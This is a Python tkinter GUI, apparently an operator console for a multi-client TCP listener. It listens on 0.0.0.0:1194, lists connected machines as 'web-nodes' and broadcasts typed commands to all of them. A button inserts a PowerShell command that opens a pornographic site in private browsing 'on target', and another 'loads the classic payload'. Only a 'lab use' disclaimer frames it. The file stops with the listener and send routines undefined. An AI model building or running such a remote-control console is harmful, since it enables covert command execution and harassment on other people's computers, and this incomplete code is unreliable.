#!/usr/bin/env python3
"""
WEB-SLINGER ULTIMATE // Maximum Spider-Vibe Multi-Client Lab Console
=======================================================================
Authorized lab use only. Features:
- BROADCAST MODE toggle - send same command to ALL web-nodes!
- COMMAND HISTORY - Up/Down arrows to navigate previous commands!
- YOUTUBE BUTTON - One-click Start-Process "https://youtube.com" !
- Animated spider logo with web-shooting, particles, spider-sense waves
- Pulsing buttons, signal bars, connection indicators
- Full multi-client TCP listener with session management
"""

import itertools
import socket
import threading
import time
import random
import math
import tkinter as tk
from tkinter import messagebox, scrolledtext, simpledialog

BG = "#050814"
PANEL_BG = "#0d1322"
INPUT_BG = "#03060f"
SPIDER_RED = "#e31b23"
SPIDER_RED_GLOW = "#ff3333"
SPIDER_RED_DARK = "#79131b"
WEB_BLUE = "#2f80ed"
WEB_BLUE_GLOW = "#4da3ff"
WEB_BLUE_DARK = "#173f76"
WEB_WHITE = "#eaf2ff"
WEB_GRAY = "#9aa8bd"
GOLD = "#ffd166"
DANGER = "#ff4d67"
SELECT_BG = "#1a2a52"
FONT_MONO = ("Consolas", 10)
FONT_TITLE = ("Consolas", 22, "bold")
FONT_LABEL = ("Consolas", 10, "bold")


class AnimatedCanvas(tk.Canvas):
    """Canvas that runs an animation loop."""
    def __init__(self, *args, fps=60, auto_start=True, **kwargs):
        super().__init__(*args, **kwargs)
        self.fps = fps
        self.running = True
        self.frame_count = 0
        if auto_start:
            self._animate()

    def _animate(self):
        if not self.running:
            return
        self.frame_count += 1
        self.on_frame(self.frame_count)
        self.after(int(1000 / self.fps), self._animate)

    def on_frame(self, frame):
        pass

    def stop(self):
        self.running = False

    def start(self):
        if not self.running:
            self.running = True
            self._animate()


class WebParticle:
    def __init__(self, x, y, vx, vy, color, life=60, size=3):
        self.x = x
        self.y = y
        self.vx = vx
        self.vy = vy
        self.color = color
        self.life = life
        self.max_life = life
        self.size = size

    def update(self):
        self.x += self.vx
        self.y += self.vy
        self.vy += 0.15
        self.life -= 1
        return self.life > 0

    def draw(self, canvas):
        alpha = self.life / self.max_life
        size = max(1, int(self.size * alpha))
        if size < 1:
            return
        canvas.create_oval(
            self.x - size, self.y - size,
            self.x + size, self.y + size,
            fill=self.color, outline=""
        )


class WebLine:
    def __init__(self, x1, y1, x2, y2, color, life=30, width=2):
        self.x1 = x1
        self.y1 = y1
        self.x2 = x2
        self.y2 = y2
        self.color = color
        self.life = life
        self.max_life = life
        self.width = width
        self.points = self._generate_web_points(x1, y1, x2, y2)

    def _generate_web_points(self, x1, y1, x2, y2):
        points = [(x1, y1)]
        segments = 6
        for i in range(1, segments):
            t = i / segments
            x = x1 + (x2 - x1) * t
            y = y1 + (y2 - y1) * t
            perp = random.uniform(-15, 15) * (1 - abs(t - 0.5) * 2)
            angle = math.atan2(y2 - y1, x2 - x1) + math.pi / 2
            x += perp * math.cos(angle)
            y += perp * math.sin(angle)
            points.append((x, y))
        points.append((x2, y2))
        return points

    def update(self):
        self.life -= 1
        return self.life > 0

    def draw(self, canvas):
        alpha = self.life / self.max_life
        width = max(1, int(self.width * alpha))
        if width < 1:
            return
        for i in range(len(self.points) - 1):
            x1, y1 = self.points[i]
            x2, y2 = self.points[i + 1]
            canvas.create_line(x1, y1, x2, y2, fill=self.color, width=width)


class SpideySenseCanvas(AnimatedCanvas):
    """Background canvas with animated web particles and spider-sense waves."""
    def __init__(self, *args, **kwargs):
        self.particles = []
        self.web_lines = []
        self.spider_x = 50
        self.spider_y = 50
        self.spider_target_x = 50
        self.spider_target_y = 50
        self.sense_waves = []
        self.last_web_shot = 0
        self.mouse_in = False
        self.width = 200
        self.height = 200

        super().__init__(*args, fps=60, auto_start=True, **kwargs)

        self.bind("<Motion>", self.on_mouse_move)
        self.bind("<Button-1>", self.on_click)
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)

    def on_enter(self, e):
        self.mouse_in = True

    def on_leave(self, e):
        self.mouse_in = False

    def on_mouse_move(self, e):
        self.spider_target_x = e.x
        self.spider_target_y = e.y

    def on_click(self, e):
        self.shoot_web(e.x, e.y)

    def shoot_web(self, tx, ty):
        now = time.time()
        if now - self.last_web_shot < 0.3:
            return
        self.last_web_shot = now
        self.web_lines.append(WebLine(
            self.spider_x, self.spider_y, tx, ty,
            WEB_BLUE_GLOW, life=25, width=3
        ))
        for _ in range(8):
            angle = random.uniform(0, 2 * math.pi)
            speed = random.uniform(2, 6)
            self.particles.append(WebParticle(
                self.spider_x, self.spider_y,
                speed * math.cos(angle), speed * math.sin(angle),
                random.choice([WEB_BLUE_GLOW, WEB_WHITE, SPIDER_RED_GLOW]),
                life=random.randint(30, 50), size=random.randint(2, 4)
            ))
        self.sense_waves.append({
            'x': self.spider_x, 'y': self.spider_y,
            'radius': 0, 'max_radius': 150, 'life': 40
        })

    def on_frame(self, frame):
        self.delete("all")
        w = self.winfo_width() or 200
        h = self.winfo_height() or 200
        self.width = w
        self.height = h

        self.spider_x += (self.spider_target_x - self.spider_x) * 0.12
        self.spider_y += (self.spider_target_y - self.spider_y) * 0.12

        if random.random() < 0.02:
            self.spawn_ambient_particle()

        for p in self.particles[:]:
            if not p.update():
                self.particles.remove(p)
            else:
                p.draw(self)

        for wl in self.web_lines[:]:
            if not wl.update():
                self.web_lines.remove(wl)
            else:
                wl.draw(self)

        for wave in self.sense_waves[:]:
            wave['radius'] += (wave['max_radius'] - wave['radius']) * 0.15
            wave['life'] -= 1
            if wave['life'] <= 0:
                self.sense_waves.remove(wave)
            else:
                alpha = wave['life'] / 40
                self.create_oval(
                    wave['x'] - wave['radius'], wave['y'] - wave['radius'],
                    wave['x'] + wave['radius'], wave['y'] + wave['radius'],
                    outline=WEB_BLUE_GLOW, width=max(1, int(3 * alpha))
                )

        self.draw_spider(self.spider_x, self.spider_y, frame)

    def spawn_ambient_particle(self):
        x = random.uniform(0, self.width)
        y = random.uniform(0, self.height)
        vx = random.uniform(-0.5, 0.5)
        vy = random.uniform(-1, -0.2)
        self.particles.append(WebParticle(
            x, y, vx, vy,
            random.choice([WEB_BLUE, WEB_WHITE, SPIDER_RED]),
            life=random.randint(80, 150), size=random.randint(1, 3)
        ))

    def draw_spider(self, x, y, frame):
        bob = math.sin(frame * 0.15) * 3
        leg_wobble = math.sin(frame * 0.3)
        body_y = y + bob

        self.create_oval(x - 10, body_y - 6, x + 10, body_y + 10,
                         fill=SPIDER_RED, outline=SPIDER_RED_GLOW, width=2)
        self.create_oval(x - 6, body_y - 2, x + 6, body_y + 14,
                         fill=SPIDER_RED_DARK, outline="")

        for i in range(4):
            angle = (i - 1.5) * 0.5 + leg_wobble * 0.3
            lx = x + math.cos(angle) * 18
            ly = body_y + math.sin(angle) * 12 + 5
            self.create_line(x, body_y + 2, lx, ly, fill=SPIDER_RED, width=2)
            angle2 = (i - 1.5) * 0.5 - leg_wobble * 0.3 + math.pi
            lx2 = x + math.cos(angle2) * 18
            ly2 = body_y + math.sin(angle2) * 12 + 5
            self.create_line(x, body_y + 2, lx2, ly2, fill=SPIDER_RED, width=2)

        eye_glow = abs(math.sin(frame * 0.2))
        self.create_oval(x - 7, body_y - 2, x - 2, body_y + 3,
                         fill=WEB_WHITE if eye_glow > 0.5 else WEB_BLUE, outline="")
        self.create_oval(x + 2, body_y - 2, x + 7, body_y + 3,
                         fill=WEB_WHITE if eye_glow > 0.5 else WEB_BLUE, outline="")


class ToggleButton(tk.Canvas):
    """Custom animated toggle switch for broadcast mode."""
    def __init__(self, parent, text_on, text_off, command, width=140, height=40,
                 color_on=SPIDER_RED_GLOW, color_off=WEB_BLUE_GLOW, font=FONT_LABEL):
        super().__init__(parent, width=width, height=height,
                         bg=PANEL_BG, highlightthickness=0, cursor="hand2")
        self.command = command
        self.text_on = text_on
        self.text_off = text_off
        self.color_on = color_on
        self.color_off = color_off
        self.width = width
        self.height = height
        self.font = font
        self.enabled = False
        self.anim_progress = 0.0
        self.target_progress = 0.0
        
        self.bind("<Button-1>", lambda e: self.toggle())
        self.bind("<Enter>", lambda e: self.set_hover(True))
        self.bind("<Leave>", lambda e: self.set_hover(False))
        self.hover = False
        self.draw()
        self.animate()

    def animate(self):
        if abs(self.anim_progress - self.target_progress) > 0.02:
            self.anim_progress += (self.target_progress - self.anim_progress) * 0.2
            self.draw()
        self.after(30, self.animate)

    def set_hover(self, h):
        self.hover = h

    def toggle(self):
        self.enabled = not self.enabled
        self.target_progress = 1.0 if self.enabled else 0.0
        self.command(self.enabled)

    def draw(self):
        self.delete("all")
        w, h = self.width, self.height
        
        r1, g1, b1 = int(self.color_off[1:3], 16), int(self.color_off[3:5], 16), int(self.color_off[5:7], 16)
        r2, g2, b2 = int(self.color_on[1:3], 16), int(self.color_on[3:5], 16), int(self.color_on[5:7], 16)
        r = int(r1 + (r2 - r1) * self.anim_progress)
        g = int(g1 + (g2 - g1) * self.anim_progress)
        b = int(b1 + (b2 - b1) * self.anim_progress)
        current_color = f"#{r:02x}{g:02x}{b:02x}"
        
        track_color = PANEL_BG
        if self.hover:
            track_color = f"#{min(255, int(PANEL_BG[1:3], 16)+20):02x}{min(255, int(PANEL_BG[3:5], 16)+20):02x}{min(255, int(PANEL_BG[5:7], 16)+20):02x}"
        
        radius = h // 2
        self.create_rectangle(radius, 2, w - radius, h - 2, 
                              outline=current_color, width=2, fill=track_color)
        self.create_oval(2, 2, 2 * radius - 2, h - 2, 
                         outline=current_color, width=2, fill=track_color)
        self.create_oval(w - 2 * radius + 2, 2, w - 2, h - 2, 
                         outline=current_color, width=2, fill=track_color)
        
        fill_width = int((w - 2 * radius) * self.anim_progress)
        if fill_width > 0:
            self.create_rectangle(radius, 2, radius + fill_width, h - 2, 
                                  outline="", fill=current_color)
            if fill_width > radius:
                self.create_oval(2, 2, 2 * radius - 2, h - 2, 
                                 outline="", fill=current_color)
        
        knob_x = 2 + int((w - 2 * radius - (h - 4)) * self.anim_progress)
        if self.enabled or self.anim_progress > 0.1:
            self.create_oval(knob_x + 1, 3 + 1, knob_x + h - 4 + 1, h - 3 + 1,
                             outline="", fill="#000000")
            self.create_oval(knob_x, 3, knob_x + h - 4, h - 3,
                             outline=current_color if self.hover else "", 
                             width=2 if self.hover else 0, fill=WEB_WHITE)
        
        off_alpha = 1.0 - self.anim_progress
        if off_alpha > 0.1:
            self.create_text(w * 0.25, h // 2, text=self.text_off, 
                             fill=WEB_GRAY, font=self.font)
        
        on_alpha = self.anim_progress
        if on_alpha > 0.1:
            self.create_text(w * 0.75, h // 2, text=self.text_on, 
                             fill=WEB_WHITE, font=self.font)
        
        dot_color = self.color_on if self.enabled else DANGER
        if self.enabled:
            pulse = abs(math.sin(time.time() * 8)) * 0.5 + 0.5
            r = int(int(dot_color[1:3], 16) * pulse)
            g = int(int(dot_color[3:5], 16) * pulse)
            b = int(int(dot_color[5:7], 16) * pulse)
            dot_color = f"#{r:02x}{g:02x}{b:02x}"
        self.create_oval(w - 18, h // 2 - 6, w - 6, h // 2 + 6,
                         fill=dot_color, outline="")


class PulsingButton(tk.Canvas):
    def __init__(self, parent, text, command, color=WEB_BLUE, glow=WEB_BLUE_GLOW,
                 width=120, height=36, font=FONT_LABEL):
        super().__init__(parent, width=width, height=height,
                         bg=PANEL_BG, highlightthickness=0, cursor="hand2")
        self.command = command
        self.color = color
        self.glow = glow
        self.button_width = width
        self.button_height = height
        self.text = text
        self.font = font
        self.pulse = 0
        self.hover = False
        self.pressed = False
        self.draw()
        self.bind("<Button-1>", lambda e: self.on_press())
        self.bind("<ButtonRelease-1>", lambda e: self.on_release())
        self.bind("<Enter>", lambda e: self.set_hover(True))
        self.bind("<Leave>", lambda e: self.set_hover(False))
        self.animate()

    def animate(self):
        self.pulse += 0.08
        self.draw()
        self.after(50, self.animate)

    def set_hover(self, h):
        self.hover = h

    def on_press(self):
        self.pressed = True
        self.draw()

    def on_release(self):
        if self.pressed:
            self.pressed = False
            self.draw()
            self.command()

    def draw(self):
        self.delete("all")
        w, h = self.button_width, self.button_height
        inset = 2 if self.pressed else 0
        pulse_glow = abs(math.sin(self.pulse)) * 0.5 + 0.5
        border_color = self.glow if self.hover else self.color
        fill_color = PANEL_BG
        if self.hover:
            r = int(fill_color[1:3], 16)
            g = int(fill_color[3:5], 16)
            b = int(fill_color[5:7], 16)
            fill_color = f"#{min(255, r+15):02x}{min(255, g+15):02x}{min(255, b+15):02x}"

        self.create_rectangle(
            inset, inset, w - 1 - inset, h - 1 - inset,
            outline=border_color, width=2 + (2 if self.hover else 0),
            fill=fill_color
        )
        if self.hover:
            for i in range(3):
                alpha = pulse_glow * (1 - i * 0.3)
                self.create_rectangle(
                    inset - i * 2, inset - i * 2,
                    w - 1 - inset + i * 2, h - 1 - inset + i * 2,
                    outline=self.glow, width=1
                )

        ty = h // 2 + (1 if self.pressed else 0)
        self.create_text(
            w // 2, ty, text=self.text, fill=border_color, font=self.font
        )


class Session:
    _ids = itertools.count(1)

    def __init__(self, sock, peer):
        self.id = next(self._ids)
        self.sock = sock
        self.peer = peer
        self.alive = True
        self.display_name = None
        self.label = f"#{self.id:02d} {peer}"
        self.log_lines = []

    def append(self, text, tag=None):
        self.log_lines.append((text, tag))

    def send(self, text):
        self.sock.sendall((text + "\n").encode("utf-8", errors="ignore"))

    def close(self):
        self.alive = False
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            self.sock.close()
        except OSError:
            pass

    def rename(self, name):
        self.display_name = name
        self.label = f"#{self.id:02d} {name} ({self.peer})"


class WebSlingerUltimate:
    def __init__(self, root):
        self.root = root
        self.root.title("🕷 WEB-SLINGER ULTIMATE // FRIENDLY NEIGHBORHOOD RELAY 🕸")
        self.root.geometry("1200x780")
        self.root.minsize(950, 600)
        self.root.configure(bg=BG)
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        self.sessions = {}
        self.active_id = None
        self.server_socket = None
        self.listener_thread = None
        self.listening = False
        self.frame_count = 0
        self.broadcast_mode = False
        
        # Command history
        self.command_history = []
        self.history_index = -1
        self.current_input = ""

        self.build_ui()
        self.root.after(250, self.auto_start_listener)
        self.animate_ui()
        self.tick_clock()

    def build_ui(self):
        main = tk.Frame(self.root, bg=BG)
        main.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)

        self.build_header(main)
        self.build_controls(main)
        self.build_body(main)
        self.build_input(main)
        self.build_status_bar(main)

    def build_header(self, parent):
        header = tk.Frame(parent, bg=BG, height=80)
        header.pack(fill=tk.X, pady=(0, 6))
        header.pack_propagate(False)

        left = tk.Frame(header, bg=BG)
        left.pack(side=tk.LEFT, padx=10, fill=tk.Y)

        self.logo_canvas = SpideySenseCanvas(
            left, width=70, height=70, bg=BG, highlightthickness=0
        )
        self.logo_canvas.pack(side=tk.LEFT, padx=(0, 10))

        title_frame = tk.Frame(left, bg=BG)
        title_frame.pack(side=tk.LEFT, fill=tk.Y)

        self.title_label = tk.Label(
            title_frame, text="WEB-SLINGER", font=FONT_TITLE,
            fg=SPIDER_RED, bg=BG
        )
        self.title_label.pack(anchor="w")

        self.subtitle_label = tk.Label(
            title_frame, text="ULTIMATE EDITION // FRIENDLY NEIGHBORHOOD RELAY",
            font=("Consolas", 9, "bold"), fg=WEB_BLUE_GLOW, bg=BG
        )
        self.subtitle_label.pack(anchor="w")

        self.disclaimer_label = tk.Label(
            title_frame, text="AUTHORIZED LAB USE ONLY  •  WITH GREAT POWER COMES GREAT RESPONSIBILITY",
            font=("Consolas", 7), fg=WEB_GRAY, bg=BG
        )
        self.disclaimer_label.pack(anchor="w", pady=(2, 0))

        right = tk.Frame(header, bg=BG)
        right.pack(side=tk.RIGHT, padx=10, fill=tk.Y)

        self.clock_label = tk.Label(
            right, text="", font=("Consolas", 14, "bold"),
            fg=WEB_BLUE_GLOW, bg=BG
        )
        self.clock_label.pack(anchor="e", pady=(10, 0))

        self.signal_canvas = tk.Canvas(right, width=60, height=30, bg=BG, highlightthickness=0)
        self.signal_canvas.pack(anchor="e", pady=(0, 5))
        self.signal_bars = 0

    def build_controls(self, parent):
        panel = tk.Frame(
            parent, bg=PANEL_BG,
            highlightbackground=SPIDER_RED_DARK, highlightthickness=2
        )
        panel.pack(fill=tk.X, pady=4)

        row = tk.Frame(panel, bg=PANEL_BG)
        row.pack(fill=tk.X, padx=12, pady=10)

        tk.Label(row, text="🕷 MODE", font=FONT_LABEL, fg=WEB_GRAY, bg=PANEL_BG).pack(side=tk.LEFT, padx=(0, 6))

        self.mode = tk.StringVar(value="listen")
        rb = tk.Radiobutton(
            row, text="◉  LISTEN / WEB OF CONNECTIONS", variable=self.mode,
            value="listen", indicatoron=False, width=28,
            font=FONT_LABEL, fg=WEB_WHITE, bg=PANEL_BG,
            selectcolor=SPIDER_RED_DARK, activebackground=PANEL_BG,
            activeforeground=WEB_WHITE, highlightthickness=0,
            disabledforeground=WEB_GRAY
        )
        rb.pack(side=tk.LEFT, padx=6)

        tk.Label(row, text="🕸 HOST", font=FONT_LABEL, fg=WEB_GRAY, bg=PANEL_BG).pack(side=tk.LEFT, padx=(16, 4))
        self.host_entry = tk.Entry(
            row, width=14, bg=INPUT_BG, fg=WEB_WHITE,
            insertbackground=SPIDER_RED_GLOW, relief=tk.FLAT,
            font=FONT_MONO, highlightthickness=1,
            highlightbackground=WEB_BLUE_DARK
        )
        self.host_entry.insert(0, "0.0.0.0")
        self.host_entry.pack(side=tk.LEFT)

        tk.Label(row, text="🔌 PORT", font=FONT_LABEL, fg=WEB_GRAY, bg=PANEL_BG).pack(side=tk.LEFT, padx=(12, 4))
        self.port_entry = tk.Entry(
            row, width=7, bg=INPUT_BG, fg=WEB_WHITE,
            insertbackground=SPIDER_RED_GLOW, relief=tk.FLAT,
            font=FONT_MONO, highlightthickness=1,
            highlightbackground=WEB_BLUE_DARK
        )
        self.port_entry.insert(0, "1194")
        self.port_entry.pack(side=tk.LEFT)

        self.broadcast_toggle = ToggleButton(
            row, "📡 BROADCAST", "🎯 SINGLE",
            self.on_broadcast_toggle, width=150, height=36,
            color_on=SPIDER_RED_GLOW, color_off=WEB_BLUE_GLOW,
            font=("Consolas", 9, "bold")
        )
        self.broadcast_toggle.pack(side=tk.LEFT, padx=8)

        btn_frame = tk.Frame(row, bg=PANEL_BG)
        btn_frame.pack(side=tk.RIGHT)

        PulsingButton(btn_frame, "▶  START WEB", self.start_listener,
                      WEB_BLUE, WEB_BLUE_GLOW, width=125).pack(side=tk.LEFT, padx=3)
        PulsingButton(btn_frame, "■  STOP ALL", self.stop_all,
                      SPIDER_RED, SPIDER_RED_GLOW, width=115).pack(side=tk.LEFT, padx=3)
        PulsingButton(btn_frame, "✕  CLOSE SEL", self.close_selected,
                      GOLD, "#ffb300", width=115).pack(side=tk.LEFT, padx=3)
        PulsingButton(btn_frame, "✎  RENAME", self.rename_selected,
                      WEB_WHITE, WEB_BLUE_GLOW, width=105).pack(side=tk.LEFT, padx=3)
        PulsingButton(btn_frame, "💬  LAB MESSAGE", self.insert_lab_message,
                      GOLD, "#ffb300", width=135).pack(side=tk.LEFT, padx=3)
        PulsingButton(btn_frame, "▶  Naughty", self.insert_youtube,
                      "#ff0000", "#ff4444", width=110).pack(side=tk.LEFT, padx=3)

    def on_broadcast_toggle(self, enabled):
        self.broadcast_mode = enabled
        mode_text = "BROADCAST TO ALL WEB-NODES" if enabled else "SINGLE NODE MODE"
        color = SPIDER_RED_GLOW if enabled else WEB_BLUE_GLOW
        self.write_output(f"[sys] 📡 {mode_text} ACTIVATED\n", "web")

    def insert_youtube(self):
        """Insert the YouTube launch command into the input field."""
        command = 'Start-Process "msedge.exe" -ArgumentList "-inprivate https://xvideos.com"'
        self.input_entry.delete(0, tk.END)
        self.input_entry.insert(0, command)
        self.input_entry.focus_set()
        if hasattr(self, 'logo_canvas') and self.logo_canvas:
            self.logo_canvas.shoot_web(
                random.randint(20, self.logo_canvas.width - 20),
                random.randint(20, self.logo_canvas.height - 20)
            )

    def build_body(self, parent):
        body = tk.Frame(parent, bg=BG)
        body.pack(fill=tk.BOTH, expand=True, pady=4)

        left_panel = tk.Frame(
            body, bg=PANEL_BG, width=300,
            highlightbackground=SPIDER_RED_DARK, highlightthickness=2
        )
        left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 6))
        left_panel.pack_propagate(False)

        tk.Label(
            left_panel, text="🕸  CONNECTED WEB-NODES", font=FONT_LABEL,
            fg=SPIDER_RED_GLOW, bg=PANEL_BG
        ).pack(anchor="w", padx=10, pady=(10, 2))
        tk.Label(
            left_panel, text="YOUR FRIENDLY NEIGHBORHOOD SOCKETS",
            font=("Consolas", 7), fg=WEB_GRAY, bg=PANEL_BG
        ).pack(anchor="w", padx=10, pady=(0, 8))

        list_frame = tk.Frame(left_panel, bg=PANEL_BG)
        list_frame.pack(fill=tk.BOTH, expand=True, padx=8, pady=(0, 8))

        self.session_list = tk.Listbox(
            list_frame, bg=INPUT_BG, fg=WEB_WHITE,
            selectbackground=SELECT_BG, selectforeground=SPIDER_RED_GLOW,
            font=FONT_MONO, relief=tk.FLAT, highlightthickness=0,
            activestyle="none", width=40
        )
        self.session_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.session_list.bind("<<ListboxSelect>>", self.select_from_list)

        scrollbar = tk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.session_list.yview,
                                 bg=PANEL_BG, troughcolor=INPUT_BG, activebackground=WEB_BLUE)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.session_list.config(yscrollcommand=scrollbar.set)

        right_panel = tk.Frame(body, bg=BG)
        right_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        terminal_bar = tk.Frame(right_panel, bg="#0e1628", height=32)
        terminal_bar.pack(fill=tk.X)
        terminal_bar.pack_propagate(False)

        self.terminal_title = tk.Label(
            terminal_bar, text=" 🕷  NO WEB-NODE SELECTED  •  CLICK A NODE TO BEGIN",
            font=("Consolas", 9, "bold"), fg=WEB_GRAY, bg="#0e1628"
        )
        self.terminal_title.pack(side=tk.LEFT, padx=12, pady=6)

        self.broadcast_indicator = tk.Canvas(
            terminal_bar, width=120, height=20, bg="#0e1628", highlightthickness=0
        )
        self.broadcast_indicator.pack(side=tk.LEFT, padx=10)
        self.broadcast_dot = self.broadcast_indicator.create_oval(2, 2, 10, 10, fill=DANGER, outline="")
        self.broadcast_indicator.create_text(60, 10, text="BROADCAST OFF", font=("Consolas", 8), fill=WEB_GRAY)

        self.connection_indicator = tk.Canvas(
            terminal_bar, width=12, height=12, bg="#0e1628", highlightthickness=0
        )
        self.connection_indicator.pack(side=tk.RIGHT, padx=12)
        self.conn_dot = self.connection_indicator.create_oval(2, 2, 10, 10, fill=DANGER, outline="")

        self.output = scrolledtext.ScrolledText(
            right_panel, wrap=tk.WORD, bg=INPUT_BG, fg=WEB_WHITE,
            insertbackground=SPIDER_RED_GLOW, font=FONT_MONO, relief=tk.FLAT,
            highlightthickness=1, highlightbackground=WEB_BLUE_DARK,
            padx=14, pady=12, state=tk.DISABLED
        )
        self.output.pack(fill=tk.BOTH, expand=True)
        self.output.tag_config("sys", foreground=GOLD)
        self.output.tag_config("sent", foreground=WEB_BLUE_GLOW)
        self.output.tag_config("err", foreground=DANGER)
        self.output.tag_config("recv", foreground=WEB_WHITE)
        self.output.tag_config("web", foreground=SPIDER_RED_GLOW)

        self.write_output(
            "[sys] █▓▒ WEB-SLINGER ULTIMATE INITIALIZED ▒▓█\n"
            "[sys] 🕷 Friendly Neighborhood Relay v2.0\n"
            "[sys] 🕸 Listener auto-spawn: 0.0.0.0:1194\n"
            "[sys] 🎯 Select a web-node before transmitting\n"
            "[sys] ✎ RENAME assigns your alias\n"
            "[sys] 💬 LAB MESSAGE loads the classic payload\n"
            "[sys] 📡 Toggle BROADCAST to send to ALL nodes\n"
            "[sys] ⬆⬇ Arrow keys navigate command history\n"
            "[sys] ▶ YOUTUBE button launches browser on target\n"
            "[sys] ⚠ AUTHORIZED LAB USE ONLY\n"
            "[sys] ———————————————————————————————\n\n",
            "sys"
        )

    def build_input(self, parent):
        bottom = tk.Frame(parent, bg=BG, height=55)
        bottom.pack(fill=tk.X, pady=(6, 0))
        bottom.pack_propagate(False)

        prompt = tk.Label(
            bottom, text="🕷", font=("Consolas", 16, "bold"),
            fg=SPIDER_RED_GLOW, bg=BG
        )
        prompt.pack(side=tk.LEFT, padx=(4, 8), pady=8)

        self.input_entry = tk.Entry(
            bottom, bg=PANEL_BG, fg=WEB_WHITE,
            insertbackground=SPIDER_RED_GLOW, relief=tk.FLAT,
            font=FONT_MONO, highlightthickness=2,
            highlightbackground=WEB_BLUE_DARK,
            highlightcolor=SPIDER_RED_GLOW
        )
        self.input_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=8, padx=(0, 8), pady=6)
        self.input_entry.bind("<Return>", self.send_data)
        self.input_entry.bind("<KeyRelease>", self.on_typing)
        self.input_entry.bind("<Up>", self.on_history_up)
        self.input_entry.bind("<Down>", self.on_history_down)

        PulsingButton(
            bottom, "🕸  SEND WEB  ▶", self.send_data,
            WEB_BLUE, WEB_BLUE_GLOW, width=130, font=("Consolas", 10, "bold")
        ).pack(side=tk.LEFT, padx=(0, 4), pady=6)

        self.typing_indicator = tk.Label(
            bottom, text="", font=("Consolas", 8), fg=WEB_BLUE_GLOW, bg=BG
        )
        self.typing_indicator.pack(side=tk.LEFT, padx=8)

    def build_status_bar(self, parent):
        bar = tk.Frame(parent, bg="#0e1628", height=28)
        bar.pack(fill=tk.X, side=tk.BOTTOM, pady=(4, 0))
        bar.pack_propagate(False)

        self.status_dot = tk.Canvas(bar, width=12, height=12, bg="#0e1628", highlightthickness=0)
        self.status_dot.pack(side=tk.LEFT, padx=(10, 4), pady=7)
        self.status_dot_id = self.status_dot.create_oval(2, 2, 10, 10, fill=DANGER, outline="")

        self.status_label = tk.Label(
            bar, text="WEB: OFFLINE", font=FONT_LABEL, fg=DANGER, bg="#0e1628"
        )
        self.status_label.pack(side=tk.LEFT)

        self.count_label = tk.Label(
            bar, text="web-nodes: 0", font=("Consolas", 9), fg=WEB_GRAY, bg="#0e1628"
        )
        self.count_label.pack(side=tk.LEFT, padx=20)

        self.ping_label = tk.Label(
            bar, text="ping: --ms", font=("Consolas", 8), fg=WEB_GRAY, bg="#0e1628"
        )
        self.ping_label.pack(side=tk.LEFT, padx=10)

        tk.Label(
            bar, text="WEB-SLINGER ULTIMATE // LAB BUILD 04 // 🕷 WITH GREAT POWER...",
            font=("Consolas", 7), fg=WEB_GRAY, bg="#0e1628"
        ).pack(side=tk.RIGHT, padx=12)

    def animate_ui(self):
        self.frame_count += 1

        blink = abs(math.sin(self.frame_count * 0.1))
        if self.listening:
            color = SPIDER_RED_GLOW if blink > 0.5 else SPIDER_RED
            self.status_dot.itemconfig(self.status_dot_id, fill=color)
            self.status_label.config(text=f"WEB: ACTIVE  🕸  PORT {self.port_entry.get()}", fg=SPIDER_RED_GLOW)
            self.connection_indicator.itemconfig(self.conn_dot, fill=SPIDER_RED_GLOW if blink > 0.3 else SPIDER_RED)
        else:
            self.status_dot.itemconfig(self.status_dot_id, fill=DANGER)
            self.status_label.config(text="WEB: OFFLINE", fg=DANGER)
            self.connection_indicator.itemconfig(self.conn_dot, fill=DANGER)

        # Update broadcast indicator
        if self.broadcast_mode:
            pulse = abs(math.sin(self.frame_count * 0.15))
            bc_color = SPIDER_RED_GLOW if pulse > 0.5 else SPIDER_RED
            self.broadcast_indicator.itemconfig(self.broadcast_dot, fill=bc_color)
            self.broadcast_indicator.itemconfig(2, text="BROADCAST ON", fill=SPIDER_RED_GLOW)
        else:
            self.broadcast_indicator.itemconfig(self.broadcast_dot, fill=DANGER)
            self.broadcast_indicator.itemconfig(2, text="BROADCAST OFF", fill=WEB_GRAY)

        if self.frame_count % 10 == 0:
            self.signal_bars = (self.signal_bars + 1) % 5
            self.draw_signal_bars()

        self.root.after(50, self.animate_ui)

    def draw_signal_bars(self):
        self.signal_canvas.delete("all")
        for i in range(4):
            h = 6 + i * 5
            color = WEB_BLUE_GLOW if i <= self.signal_bars else WEB_BLUE_DARK
            self.signal_canvas.create_rectangle(
                8 + i * 12, 28 - h, 16 + i * 12, 28,
                fill=color, outline=""
            )

    def tick_clock(self):
        self.clock_label.config(text=time.strftime("%H:%M:%S"))
        if self.frame_count % 20 == 0:
            self.ping_label.config(text=f"ping: {random.randint(12, 88)}ms")
        self.root.after(1000, self.tick_clock)

    def on_typing(self, e):
        if self.active_id or self.broadcast_mode:
            self.typing_indicator.config(text="🕷 transmitting...")
            self.root.after(1000, lambda: self.typing_indicator.config(text=""))

    def on_history_up(self, event):
        if not self.command_history:
            return "break"
        if self.history_index == -1:
            self.current_input = self.input_entry.get()
        if self.history_index < len(self.command_history) - 1:
            self.history_index += 1
            cmd = self.command_history[-(self.history_index + 1)]
            self.input_entry.delete(0, tk.END)
            self.input_entry.insert(0, cmd)
        return "break"

    def on_history_down(self, event):
        if not self.command_history or self.history_index == -1:
            return "break"
        if self.history_index > 0:
            self.history_index -= 1
            cmd = self.command_history[-(self.history_index + 1)]
            self.input_entry.delete(0, tk.END)
            self.input_entry.insert(0, cmd)
        else:
            self.history_index = -1
            self.input_entry.delete(0, tk.END)
            self.input_entry.insert(0, self.current_input)
        return "break"

    def add_to_history(self, cmd):
        cmd = cmd.strip()
        if not cmd:
            return
        if self.command_history and self.command_history[-1] == cmd:
            return
        self.command_history.append(cmd)
        if len(self.command_history) > 500:
            self.command_history.pop(0)
        self.history_index = -1
        self.current_input = ""

    def write_output(self, text, tag=None):
        self.output.config(state=tk.NORMAL)
        self.output.insert(tk.END, text, tag or "")
        self.output.see(tk.END)
        self.output.config(state=tk.DISABLED)

